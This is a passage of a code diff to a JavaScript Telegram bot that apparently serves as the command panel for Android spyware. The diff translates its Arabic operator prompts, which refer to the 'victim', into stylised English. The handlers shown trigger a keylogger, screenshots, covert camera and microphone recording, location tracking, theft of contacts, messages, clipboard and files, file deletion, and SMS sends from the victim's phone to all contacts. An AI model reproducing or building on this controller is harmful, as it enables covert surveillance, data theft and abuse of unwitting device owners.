+                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
                             callback_data: `send_message_to_all:${uuid}`
                         },
                     ],
                     [
                         {
-                            text: 'أزرار الجهاز',
+                            text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝘽𝙪𝙩𝙩𝙤𝙣𝙨',
                             callback_data: `device_button:${uuid}`
                         },
                     ]
@@ -494,8 +487,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'contacts') {
@@ -506,8 +499,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'messages') {
@@ -518,8 +511,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'apps') {
@@ -530,8 +523,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'device_info') {
@@ -542,8 +535,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'clipboard') {
@@ -554,8 +547,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'camera_main') {
@@ -566,8 +559,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'camera_selfie') {
@@ -578,8 +571,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'location') {
@@ -590,8 +583,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'vibrate') {
@@ -602,8 +595,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'stop_audio') {
@@ -614,26 +607,22 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'send_message') {
         appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية
-
-' +
-            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
+        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
+            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
             {reply_markup: {force_reply: true}})
         currentUuid = uuid
     }
     if (commend == 'send_message_to_all') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع
-
-' +
-            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
+            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
             {reply_markup: {force_reply: true}}
         )
         currentUuid = uuid
@@ -642,8 +631,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'open_target_link') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°•أدخل الرابط الذي تريد إرساله\n\n' +
-            '• احذر من إرسال الروابط وحدها 2 بدون أي نص',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙\n\n' +
+            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛᴏ sᴇɴᴅ ʟɪɴᴋs ᴀʟᴏɴᴇ ᴡɪᴛʜᴏᴜᴛ ᴀɴʏ ᴛᴇxᴛ',
             {reply_markup: {force_reply: true}}
         )
         currentUuid = uuid
@@ -651,8 +640,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'text_to_speech') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• أدخل النص المراد نطقه\n\n' +
-            '•  لاحظ أنه يجب عليك إدخال النص الذي يجب نطقه على الجهاز. أي لغة مقبولة..',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠\n\n' +
+            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛᴇxᴛ ᴛʜᴀᴛ ʜᴀs ᴛᴏ ʙᴇ sᴘᴏᴋᴇɴ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ. ᴀɴʏ ʟᴀɴɢᴜᴀɢᴇ ᴀᴄᴄᴇᴘᴛɪʙʟᴇ.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -670,7 +659,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                     'resize_keyboard': true
                 }
             }
@@ -685,8 +674,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'torch_off') {
@@ -697,8 +686,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'keylogger_on') {
@@ -709,8 +698,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'keylogger_off') {
@@ -721,8 +710,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
     if (commend == 'screenshot') {
@@ -733,8 +722,8 @@ appBot.on("callback_query", (callbackQuery) => {
         });
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
         )
     }
 
@@ -824,8 +813,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'file') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
-            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
+            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -833,8 +822,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'delete_file') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• ادخل مسار الملف الذي تريد \n\n' +
-            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
+            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -842,8 +831,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'microphone') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• ادخل مسار الملف الذي تريد \n\n' +
-            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
+            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -851,8 +840,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'rec_camera_selfie') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°•أدخل المدة التي تريد أن تسجل فيها الكاميرا صورة السيلفي\n\n' +
-            '• لاحظ أنه يجب عليك إدخال الوقت 2 رقميًا بوحدات الثواني.',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
+            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -860,8 +849,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'rec_camera_main') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• على تظهر ان تريد التي الرسالة ادخل ...الضحية جهاز ؟\n\n' +
-            '• الجهاز شاشة على تظهر قصيرة رسالة هي ثوان لبضع ؟',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
+            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -869,8 +858,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'toast') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
-            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
+            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -878,8 +867,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'show_notification') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
-            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
+            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
@@ -887,8 +876,8 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'play_audio') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
-            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
